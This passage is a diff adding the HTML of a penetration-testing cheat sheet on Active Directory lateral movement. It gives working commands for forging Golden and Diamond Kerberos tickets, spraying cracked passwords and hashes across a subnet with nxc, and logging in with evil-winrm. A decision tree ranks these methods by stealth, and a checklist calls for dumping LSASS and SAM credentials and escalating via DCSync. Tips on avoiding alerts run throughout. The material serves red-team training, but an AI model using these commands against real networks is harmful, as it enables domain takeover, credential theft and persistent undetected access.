+<li>Limited to the SPN you forged</li>
+</ul>
+<h2 id="xi-golden-ticket---forge-any-tgt" data-heading-permalink="true"><span class="heading-content">xi. Golden Ticket - forge any TGT</span>
+    <a class="heading-permalink" href="#xi-golden-ticket---forge-any-tgt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have the krbtgt hash (via DCSync, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/">DCSync</a>
+), forge a TGT for any user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$KRBTGT_NTHASH</span> -domain-sid <span class="nv">$DOMAIN_SID</span> -domain <span class="nv">$DOMAIN</span> Administrator
+</span></span><span class="line"><span class="cl"><span class="c1">## or with AES (preferred, fewer alerts):</span>
+</span></span><span class="line"><span class="cl">impacket-ticketer -aesKey <span class="nv">$KRBTGT_AES</span> -domain-sid <span class="nv">$DOMAIN_SID</span> -domain <span class="nv">$DOMAIN</span> Administrator
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass dc.<span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><p>Golden tickets:</p>
+<ul>
+<li>Valid as long as the krbtgt password is unchanged</li>
+<li>Used for long-term persistence (see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">Persistence</a>
+)</li>
+<li>Detectable by long-lifetime TGTs and PAC anomalies</li>
+</ul>
+<h2 id="xii-diamond-ticket---modify-a-real-tgt-instead-of-forging" data-heading-permalink="true"><span class="heading-content">xii. Diamond Ticket - modify a real TGT instead of forging</span>
+    <a class="heading-permalink" href="#xii-diamond-ticket---modify-a-real-tgt-instead-of-forging" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Less detectable than Golden. Requires krbtgt AES key. Re-encrypts an existing TGT after modifying its PAC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -aesKey <span class="nv">$KRBTGT_AES</span> -domain-sid <span class="nv">$DOMAIN_SID</span> -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -request -user-id <span class="m">500</span> -groups 512,513,518,519,520 Administrator <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip <span class="nv">$DC</span> -user <span class="nv">$USER</span> -password <span class="nv">$PASS</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## &#34;Diamond&#34; mode reuses a real DC-issued TGT, harder for PAC anomaly detection</span>
+</span></span></code></pre></div><h2 id="xiii-sapphire-ticket---diamond--s4u-self-extension" data-heading-permalink="true"><span class="heading-content">xiii. Sapphire Ticket - diamond + S4U self-extension</span>
+    <a class="heading-permalink" href="#xiii-sapphire-ticket---diamond--s4u-self-extension" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The newest variant - uses S4U2self with PAC modification to generate a near-perfect-looking TGS. Tooling is still maturing; impacket supports the core, and tools like ticketer-related forks have updates.</p>
+<h2 id="xiv-local-admin-via-domain-users-credential-reuse" data-heading-permalink="true"><span class="heading-content">xiv. Local admin via &ldquo;Domain Users&rdquo; credential reuse</span>
+    <a class="heading-permalink" href="#xiv-local-admin-via-domain-users-credential-reuse" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The lowest-effort lateral on most networks: spray a cracked password as the LOCAL account too:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.0/24 -u Administrator -p <span class="s1">&#39;CrackedPass!&#39;</span> --local-auth --continue-on-success
+</span></span><span class="line"><span class="cl">nxc smb 10.10.11.0/24 -u Administrator -H <span class="nv">$LOCAL_ADMIN_HASH</span> --local-auth --continue-on-success
+</span></span></code></pre></div><p>Without LAPS, the local Administrator password is often shared across many hosts.</p>
+<h2 id="xv-winrm-as-the-cleanest-lateral" data-heading-permalink="true"><span class="heading-content">xv. WinRM as the cleanest lateral</span>
+    <a class="heading-permalink" href="#xv-winrm-as-the-cleanest-lateral" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When PSRemoting is enabled (port 5985/5986), WinRM is the least noisy lateral. No service install, full PowerShell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i target.<span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span>
+</span></span><span class="line"><span class="cl">evil-winrm -i target.<span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## with Kerberos:</span>
+</span></span><span class="line"><span class="cl">evil-winrm -i target.<span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> --realm <span class="nv">$DOMAIN</span> --service-name http
+</span></span></code></pre></div><h2 id="xvi-decision-tree" data-heading-permalink="true"><span class="heading-content">xvi. Decision tree</span>
+    <a class="heading-permalink" href="#xvi-decision-tree" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You have credentials + want to lateral, in order of OPSEC quality:</p>
+<ol>
+<li><strong>WinRM available?</strong> -&gt; evil-winrm (cleanest, full PowerShell)</li>
+<li><strong>WMI accessible?</strong> -&gt; impacket-wmiexec (no service install)</li>
+<li><strong>SMB only?</strong> -&gt; impacket-smbexec (no binary on disk) then impacket-psexec as fallback</li>
+<li><strong>Kerberos required by policy?</strong> -&gt; get TGT, then any of the above with <code>-k -no-pass</code></li>
+<li><strong>Only have a hash, target enforces Kerberos?</strong> -&gt; Overpass-the-Hash to get AES TGT</li>
+<li><strong>Need to impersonate a different user?</strong> -&gt; RBCD chain or S4U2self+proxy</li>
+</ol>
+<h2 id="xvii-post-lateral-always" data-heading-permalink="true"><span class="heading-content">xvii. Post-lateral, always</span>
+    <a class="heading-permalink" href="#xvii-post-lateral-always" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ol>
+<li>Mark the new host&rsquo;s owner in BloodHound</li>
+<li>Run <a href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">Local Enum</a>
+ on the host</li>
+<li>Dump credentials from this host with <a href="https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/">PrivEsc - Credentials &amp; Files</a>
+ (LSASS, SAM, etc)</li>
+<li>Re-collect BloodHound for new paths</li>
+<li>Continue lateral or escalate to DA via <a href="https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/">DCSync</a>
+</li>
+</ol>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad09-adcs-esc1-16/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">ADCS ESC1-16</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad11-credential-dumping/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Credential Dumping</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
